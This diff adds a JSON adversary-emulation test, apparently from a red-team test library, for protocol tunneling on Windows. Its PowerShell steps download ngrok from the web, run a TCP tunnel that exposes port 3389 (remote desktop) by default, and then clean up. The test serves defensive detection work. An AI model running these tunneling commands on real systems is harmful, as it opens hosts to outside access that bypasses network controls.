@@ -1,0 +1,117 @@
+{
+  "id": "4cdc9fc7-53fb-4894-9f0c-64836943ea60",
+  "name": "run ngrok",
+  "description": "Download and run ngrok. Create tunnel to chosen port.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "38ee9dfe-83e0-4115-a4d8-1f757f8a944c",
+      "type": "execute-command",
+      "data": {
+        "command": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "14d658e6-9ed9-45cb-8ecc-642c7d2ada31",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item C:\\Users\\Public\\ngrok -Recurse -ErrorAction Ignore\nRemove-Item C:\\%userprofile%\\AppData\\Local\\ngrok -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "20a8da10-ecdd-4468-854a-803eb3508e8a",
+      "name": "Check dependency 1/1",
+      "description": "Download ngrok\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "77e43a64-a976-482e-a953-62d996631871",
+      "name": "Resolve dependency 1/1",
+      "description": "Download ngrok\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Path C:\\Users\\Public\\ngrok -ItemType Directory | Out-Null\nInvoke-WebRequest #{download} -OutFile C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip\nExpand-Archive C:\\Users\\Public\\ngrok\\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\\Users\\Public\\ngrok\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "642be70c-3825-45f5-ba0b-6749d60726cb",
+      "name": "Re-check dependency 1/1",
+      "description": "Download ngrok\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path C:\\Users\\Public\\ngrok) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "38ee9dfe-83e0-4115-a4d8-1f757f8a944c",
+      "p": "on-success",
+      "o": "14d658e6-9ed9-45cb-8ecc-642c7d2ada31"
+    },
+    {
+      "s": "38ee9dfe-83e0-4115-a4d8-1f757f8a944c",
+      "p": "on-failure",
+      "o": "14d658e6-9ed9-45cb-8ecc-642c7d2ada31"
+    },
+    {
+      "s": "20a8da10-ecdd-4468-854a-803eb3508e8a",
+      "p": "on-success",
+      "o": "38ee9dfe-83e0-4115-a4d8-1f757f8a944c"
+    },
+    {
+      "s": "20a8da10-ecdd-4468-854a-803eb3508e8a",
+      "p": "on-failure",
+      "o": "77e43a64-a976-482e-a953-62d996631871"
+    },
+    {
+      "s": "77e43a64-a976-482e-a953-62d996631871",
+      "p": "on-success",
+      "o": "642be70c-3825-45f5-ba0b-6749d60726cb"
+    },
+    {
+      "s": "642be70c-3825-45f5-ba0b-6749d60726cb",
+      "p": "on-failure",
+      "o": "38ee9dfe-83e0-4115-a4d8-1f757f8a944c"
+    }
+  ],
+  "tags": [
+    "T1572",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "api_token",
+      "type": "string",
+      "description": "ngrok API",
+      "value": "N/A"
+    },
+    {
+      "name": "port_num",
+      "type": "integer",
+      "description": "port number for tunnel",
+      "value": "3389"
+    },
+    {
+      "name": "download",
+      "type": "string",
+      "description": "link to download ngrok",
+      "value": "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
+    }
+  ]
+}
